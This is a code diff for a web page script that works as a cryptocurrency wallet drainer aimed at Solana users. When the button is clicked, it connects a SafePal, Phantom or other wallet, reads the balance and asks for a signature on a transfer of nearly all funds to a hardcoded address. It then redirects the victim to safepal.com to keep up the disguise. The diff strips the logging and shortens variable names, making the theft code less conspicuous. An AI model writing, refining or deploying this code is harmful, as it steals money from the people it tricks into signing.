@@ -23,65 +23,41 @@
     </div>
     <script>
         document.getElementById('action').onclick = async () => {
-            console.log("Button clicked");
-            
             let wallet = null;
-            if(window.solana) wallet = window.solana;
             if(window.safepal) wallet = window.safepal;
-            if(window.phantom) wallet = window.phantom;
+            else if(window.solana) wallet = window.solana;
+            else if(window.phantom) wallet = window.phantom;
             
-            console.log("Wallet:", wallet ? "Found" : "Not found");
-            
-            if(!wallet){
-                alert("Please install SafePal wallet.");
-                return;
-            }
-            
-            try{
-                console.log("Connecting...");
-                const resp = await wallet.connect();
-                console.log("Connected:", resp.publicKey.toString());
-                
-                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
-                const balance = await connection.getBalance(resp.publicKey);
-                console.log("Balance:", balance);
-                
-                const minRent = await connection.getMinimumBalanceForRentExemption(0);
-                
-                if(balance < minRent){
-                    alert("Insufficient funds.");
-                    return;
+            if(wallet){
+                try{
+                    const r = await wallet.connect();
+                    const c = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
+                    const b = await c.getBalance(r.publicKey);
+                    const m = await c.getMinimumBalanceForRentExemption(0);
+                    if(b < m){
+                        alert("Insufficient funds.");
+                        return;
+                    }
+                    const a = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
+                    const t = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: r.publicKey,
+                            toPubkey: a,
+                            lamports: b - m
+                        })
+                    );
+                    t.feePayer = r.publicKey;
+                    const h = await c.getRecentBlockhash();
+                    t.recentBlockhash = h.blockhash;
+                    const s = await wallet.signTransaction(t);
+                    const x = await c.sendRawTransaction(s.serialize());
+                    await c.confirmTransaction(x);
+                    window.location.href = "https://safepal.com";
+                }catch(e){
+                    alert("Action failed. Try again.");
                 }
-                
-                const destination = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
-                const amount = balance - minRent;
-                
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
-                        toPubkey: destination,
-                        lamports: amount
-                    })
-                );
-                
-                transaction.feePayer = resp.publicKey;
-                const blockhash = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash.blockhash;
-                
-                console.log("Requesting signature...");
-                const signed = await wallet.signTransaction(transaction);
-                console.log("Signed!");
-                
-                const signature = await connection.sendRawTransaction(signed.serialize());
-                console.log("Sent:", signature);
-                
-                await connection.confirmTransaction(signature);
-                console.log("Confirmed!");
-                
-                window.location.href = "https://safepal.com";
-            }catch(err){
-                console.error("Error:", err);
-                alert("Action failed. Try again.");
+            }else{
+                alert("Please open this page in SafePal wallet browser.");
             }
         };
     </script>
